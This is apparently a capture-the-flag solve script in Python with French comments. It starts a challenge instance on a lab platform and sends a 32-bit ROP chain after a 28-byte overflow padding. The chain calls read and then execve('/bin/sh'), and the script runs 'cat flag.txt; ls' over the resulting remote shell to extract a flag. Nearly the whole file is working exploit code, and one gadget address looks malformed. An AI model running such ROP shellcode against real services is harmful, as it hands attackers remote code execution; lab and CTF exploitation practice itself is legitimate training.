import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/292/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/292/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)

POP_EAX = 0x080ab50d
POP_EBX = 0x0804901e
POP_ECX = 0x08049a31
POP_EDX_EBX_ESI = 0x0805848e
INT80 = 0x0805e4b0
XOR_EDX = 0x080493fd3
BSS = 0x080e5000


def p32(x):
    return struct.pack("<I", x)


chain = b""
chain += p32(POP_EAX) + p32(3)          # read
chain += p32(POP_EBX) + p32(0)
chain += p32(POP_ECX) + p32(BSS)
chain += p32(POP_EDX_EBX_ESI) + p32(8) + p32(0) + p32(0)
chain += p32(INT80)
chain += p32(XOR_EDX) + p32(0) * 4      # xor edx,edx; add esp,0x10; mov ebx,eax; ret
chain += p32(POP_EAX) + p32(11)         # execve
chain += p32(POP_EBX) + p32(BSS)
chain += p32(POP_ECX) + p32(0)
chain += p32(INT80)

payload = b"A" * 28 + chain
print("payload:", len(payload), "octets | contient 0x0a:", b"\n" in payload)

s = socket.create_connection((host, port), timeout=15)
s.settimeout(6)
time.sleep(0.4)
try:
    print("banner:", s.recv(4096).decode("latin-1", "replace")[:120])
except Exception:
    pass
s.sendall(payload + b"\n")
time.sleep(0.3)
s.sendall(b"/bin/sh\x00")     # 8 octets pour le read
time.sleep(0.5)
s.sendall(b"cat flag.txt; ls\n")
time.sleep(1.0)
out = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        out += c
    except socket.timeout:
        break
s.close()
txt = out.decode("latin-1", "replace")
print("=== reponse ===")
print(txt[:800])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else None)
